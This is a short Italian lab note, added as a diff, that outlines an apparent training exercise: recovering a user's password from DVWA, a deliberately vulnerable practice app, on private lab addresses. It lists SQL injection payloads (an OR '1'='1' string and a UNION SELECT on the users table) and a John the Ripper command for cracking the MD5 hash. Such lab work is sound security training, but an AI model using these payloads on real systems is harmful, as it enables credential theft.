@@ -1,0 +1,17 @@
+--- TRACCIA 1 - SQL INJECTION ----
+Ip 1: 192.168.13.100/24
+Ip 2: 192.168.13.150/24
+
+Obiettivo: scoprire la password di PABLO PICASSO su DVWA con il SQL Injection
+
+-----------------------------------
+Roadmap:
+1. Service apache2 start
+2. Login in DVWA
+3. Configurazione low security in DVWA
+4. SQL enumerazione utenti --> 1' OR '1' = '1 (foto 1)
+5. SQL prova colonne --> 'UNION SELECT first_name, password FROM users (foto 2)
+6. Hash indetifier --> https://hashes.com/en/tools/hash_identifier --> MD5
+7. Creazione file di testo con la password dentro --> pass.txt
+8. John the Ripper --> john --show --format=Raw-MD5 pass.txt (foto 3)
+ 
